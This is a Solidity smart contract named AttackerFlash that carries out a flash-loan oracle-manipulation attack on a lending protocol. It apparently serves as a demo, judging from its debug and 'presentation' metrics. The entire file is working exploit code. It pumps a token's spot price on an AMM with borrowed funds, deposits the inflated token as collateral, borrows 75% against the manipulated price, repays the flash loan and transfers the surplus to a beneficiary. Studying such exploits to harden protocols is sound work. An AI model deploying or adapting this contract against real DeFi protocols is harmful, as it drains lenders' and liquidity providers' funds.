// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IAMM {
    function swapAForB(uint256) external returns (uint256);
    function swapBForA(uint256) external returns (uint256);
    function getSpotPrice() external view returns (uint256);
}

interface ILending {
    function borrow(uint256 amount) external;
    function repay(uint256 amount) external;
    function depositCollateral(uint256 amount) external;
    function collateralB(address) external view returns (uint256);
    function debtA(address) external view returns (uint256);
}

interface IFlashLoanProvider {
    function flashLoan(address receiver, uint256 amount, bytes calldata params) external;
}

contract AttackerFlash {
    IERC20 public tokenA;
    IERC20 public tokenB;
    IAMM public amm1;           // high-liquidity pool for price manipulation
    IAMM public amm2;           // low-liquidity pool for fair-price swaps
    ILending public lending;
    IFlashLoanProvider public flashProvider;
    address public beneficiary;

    // For tracking attack progress
    uint256 public lastProfit;
    bool public lastAttackSucceeded;

    // DEBUG: Store values from last execution
    uint256 public debugLoanedAmount;
    uint256 public debugBoughtB;
    uint256 public debugInflatedPrice;
    uint256 public debugCollateralValueInA;
    uint256 public debugMaxBorrowA;
    uint256 public debugFlashFee;
    uint256 public debugRepaymentAmount;
    uint256 public debugBorrowAmount;
    uint256 public debugContractBalanceAfter;
    uint256 public debugLeftoverA;
    
    // Additional metrics for presentation
    uint256 public debugPriceMultiplier;    // How much price increased (inflatedPrice / initialPrice)
    uint256 public debugProfitROI;          // ROI: (profit / loanAmount) * 100
    uint256 public debugLTVUsed;            // LTV actually used: (borrowAmount / collateralValueInA)
    uint256 public debugPricePumpPercentage; // Price increase percentage

    constructor(
        address _tokenA,
        address _tokenB,
        address _amm1,
        address _amm2,
        address _lending,
        address _flashProvider,
        address _beneficiary
    ) {
        tokenA = IERC20(_tokenA);
        tokenB = IERC20(_tokenB);
        amm1 = IAMM(_amm1);
        amm2 = IAMM(_amm2);
        lending = ILending(_lending);
        flashProvider = IFlashLoanProvider(_flashProvider);
        beneficiary = _beneficiary;
    }

    function executeAttack(uint256 flashLoanAmount) external {
        require(flashLoanAmount > 0, "zero loan");

        // Initiate the flash loan
        // The callback (executeOperation) will be triggered by flashProvider
        bytes memory params = abi.encode(flashLoanAmount);
        flashProvider.flashLoan(address(this), flashLoanAmount, params);
    }

    function executeOperation(uint256 loanedAmount, bytes calldata params) external {
        require(msg.sender == address(flashProvider), "only flashProvider");
        uint256 decodedAmount = abi.decode(params, (uint256));
        require(decodedAmount == loanedAmount, "amount mismatch");

        // DEBUG: Store loaned amount
        debugLoanedAmount = loanedAmount;

        // ============================================================
        // PHASE 1: PUMP B PRICE USING FLASH-LOANED A
        // ============================================================
        // We have loanedAmount of TokenA
        // Approve and swap ALL for TokenB on AMM1
        tokenA.approve(address(amm1), loanedAmount);
        uint256 boughtB = amm1.swapAForB(loanedAmount);
        
        // DEBUG: Store bought B
        debugBoughtB = boughtB;
        
        // Now we have: boughtB TokenB, 0 TokenA
        // The AMM1 price has spiked - A is now much more expensive per unit B

        // ============================================================
        // PHASE 2: DEPOSIT INFLATED COLLATERAL
        // ============================================================
        // Approve and deposit our TokenB as collateral
        tokenB.approve(address(lending), boughtB);
        lending.depositCollateral(boughtB);
        
        // Now the lending protocol records us as having boughtB collateral

        // ============================================================
        // PHASE 3: BORROW AT INFLATED PRICE
        // ============================================================
        // Query the spot price - it's now very high (A is expensive)
        uint256 inflatedSpotPrice = amm1.getSpotPrice();
        
        // DEBUG: Store inflated price
        debugInflatedPrice = inflatedSpotPrice;
        
        // Calculate max borrow using lending's formula:
        // collateralValue = collateral_B * spotPrice_A_per_B
        // maxBorrow = collateralValue * 75% LTV
        uint256 collateralValueInA = (boughtB * inflatedSpotPrice) / 1e18;
        uint256 maxBorrowA = (collateralValueInA * 7500) / 10000; // 75% LTV
        
        // DEBUG: Store calculation intermediate values
        debugCollateralValueInA = collateralValueInA;
        debugMaxBorrowA = maxBorrowA;
        
        // We want to borrow as much as possible
        // But we also need to account for:
        // 1. Flash loan repayment: loanedAmount + fee
        // 2. A small buffer
        
        // Let's calculate the fee
        uint256 flashFeeBP = 5; // 0.05% fee from FlashLoanProvider
        uint256 flashFee = (loanedAmount * flashFeeBP) / 10000;
        uint256 repaymentAmount = loanedAmount + flashFee;
        
        // DEBUG: Store fee calculations
        debugFlashFee = flashFee;
        debugRepaymentAmount = repaymentAmount;
        
        // Borrow at most what we're allowed to
        // In a real attack, we'd borrow the maximum
        uint256 borrowAmount = maxBorrowA;
        
        // DEBUG: Store borrow amount
        debugBorrowAmount = borrowAmount;
        
        require(borrowAmount > repaymentAmount, "borrow <= repayment, no profit");
        
        lending.borrow(borrowAmount);
        
        // Now we have: borrowAmount TokenA, boughtB TokenB as collateral
        
        // ============================================================
        // PHASE 4: REPAY FLASH LOAN
        // ============================================================
        // We MUST transfer the full repayment (loan + fee) back to the flash provider
        // This is what the flashProvider checks for
        require(tokenA.balanceOf(address(this)) >= repaymentAmount, "insufficient for repayment");
        
        // Transfer repayment back to flash provider
        tokenA.transfer(address(flashProvider), repaymentAmount);
        
        // ============================================================
        // PHASE 5: OPTIONAL - DEMONSTRATE PROFIT TAKING
        // ============================================================
        // Calculate profit: what we have leftover after repayment
        uint256 leftoverA = borrowAmount - repaymentAmount;
        
        // DEBUG: Store leftover and final balance
        debugLeftoverA = leftoverA;
        debugContractBalanceAfter = tokenA.balanceOf(address(this));
        
        // Calculate metrics and store directly to avoid stack issues
        uint256 initialPrice = 1500000000000000000; // ~1.5 * 1e18 (1000 A / 1500 B)
        debugPriceMultiplier = (inflatedSpotPrice * 100) / initialPrice;
        debugProfitROI = (leftoverA * 10000) / loanedAmount;
        debugLTVUsed = (borrowAmount * 10000) / collateralValueInA;
        debugPricePumpPercentage = ((inflatedSpotPrice - initialPrice) * 100) / initialPrice;
        
        // In a real attack, you might:
        // - Keep TokenA as is (direct profit)
        // - Swap some TokenA for TokenB on AMM2 for diversification
        // - Send to beneficiary immediately
        
        // For this demo, let's keep it simple:
        // Store profit amount and send TokenA to beneficiary
        lastProfit = leftoverA;
        lastAttackSucceeded = true;
        
        if (leftoverA > 0) {
            tokenA.transfer(beneficiary, leftoverA);
        }
    }

    function executeAttackV2(uint256 flashLoanAmount, uint256 bAmountToSwapBack) external {
        require(flashLoanAmount > 0, "zero loan");
        require(bAmountToSwapBack <= flashLoanAmount, "invalid B swap amount");

        bytes memory params = abi.encode(flashLoanAmount, bAmountToSwapBack);
        flashProvider.flashLoan(address(this), flashLoanAmount, params);
    }

    function executeOperationV2(uint256 loanedAmount, bytes calldata params) external {
        require(msg.sender == address(flashProvider), "only flashProvider");
        (uint256 decodedAmount, uint256 bSwapBackAmount) = abi.decode(params, (uint256, uint256));
        require(decodedAmount == loanedAmount, "amount mismatch");

        // Phase 1: Pump B price
        tokenA.approve(address(amm1), loanedAmount);
        uint256 boughtB = amm1.swapAForB(loanedAmount);
        
        // Phase 2: Deposit collateral
        tokenB.approve(address(lending), boughtB);
        lending.depositCollateral(boughtB);
        
        // Phase 3: Borrow at inflated price
        uint256 inflatedSpotPrice = amm1.getSpotPrice();
        uint256 collateralValueInA = (boughtB * inflatedSpotPrice) / 1e18;
        uint256 maxBorrowA = (collateralValueInA * 7500) / 10000; // 75% LTV
        
        uint256 flashFeeBP = 5;
        uint256 flashFee = (loanedAmount * flashFeeBP) / 10000;
        uint256 repaymentAmount = loanedAmount + flashFee;
        
        uint256 borrowAmount = maxBorrowA;
        require(borrowAmount > repaymentAmount, "borrow <= repayment, no profit");
        
        lending.borrow(borrowAmount);
        
        // Phase 4: Use some borrowed A to swap for B on AMM2 (optional)
        // This demonstrates swapping at a "fairer" price
        if (bSwapBackAmount > 0 && bSwapBackAmount <= borrowAmount - repaymentAmount) {
            tokenA.approve(address(amm2), bSwapBackAmount);
            // amm2.swapAForB(bSwapBackAmount); // optional
        }
        
        // Phase 5: Repay flash loan first
        require(tokenA.balanceOf(address(this)) >= repaymentAmount, "insufficient for repayment");
        tokenA.transfer(address(flashProvider), repaymentAmount);
        
        // Phase 6: Calculate and send profit
        uint256 leftoverA = borrowAmount - repaymentAmount;
        
        // Store debug values for V2 as well
        debugLoanedAmount = loanedAmount;
        debugBoughtB = boughtB;
        debugInflatedPrice = inflatedSpotPrice;
        debugCollateralValueInA = collateralValueInA;
        debugMaxBorrowA = maxBorrowA;
        debugFlashFee = flashFee;
        debugRepaymentAmount = repaymentAmount;
        debugBorrowAmount = borrowAmount;
        debugContractBalanceAfter = tokenA.balanceOf(address(this));
        debugLeftoverA = leftoverA;
        
        // Calculate metrics for V2
        uint256 initialPrice = 1500000000000000000;
        debugPriceMultiplier = (inflatedSpotPrice * 100) / initialPrice;
        debugProfitROI = (leftoverA * 10000) / loanedAmount;
        debugLTVUsed = (borrowAmount * 10000) / collateralValueInA;
        debugPricePumpPercentage = ((inflatedSpotPrice - initialPrice) * 100) / initialPrice;
        
        lastProfit = leftoverA;
        lastAttackSucceeded = true;
        
        if (leftoverA > 0) {
            tokenA.transfer(beneficiary, leftoverA);
        }
    }

    function getState() external view returns (
        uint256 beneficiaryA,
        uint256 beneficiaryB,
        uint256 contractA,
        uint256 contractB,
        uint256 myCollateral,
        uint256 myDebt,
        uint256 lastProfitAmount,
        bool succeeded
    ) {
        return (
            tokenA.balanceOf(beneficiary),
            tokenB.balanceOf(beneficiary),
            tokenA.balanceOf(address(this)),
            tokenB.balanceOf(address(this)),
            lending.collateralB(address(this)),
            lending.debtA(address(this)),
            lastProfit,
            lastAttackSucceeded
        );
    }

    function getDebugState() external view returns (
        uint256 loanedAmount,
        uint256 boughtB,
        uint256 inflatedPrice,
        uint256 collateralValueInA,
        uint256 maxBorrowA,
        uint256 flashFee,
        uint256 repaymentAmount,
        uint256 borrowAmount,
        uint256 contractBalanceAfter,
        uint256 leftoverA,
        uint256 priceMultiplier,
        uint256 profitROI,
        uint256 ltvUsed,
        uint256 pricePumpPercentage
    ) {
        return (
            debugLoanedAmount,
            debugBoughtB,
            debugInflatedPrice,
            debugCollateralValueInA,
            debugMaxBorrowA,
            debugFlashFee,
            debugRepaymentAmount,
            debugBorrowAmount,
            debugContractBalanceAfter,
            debugLeftoverA,
            debugPriceMultiplier,
            debugProfitROI,
            debugLTVUsed,
            debugPricePumpPercentage
        );
    }
}
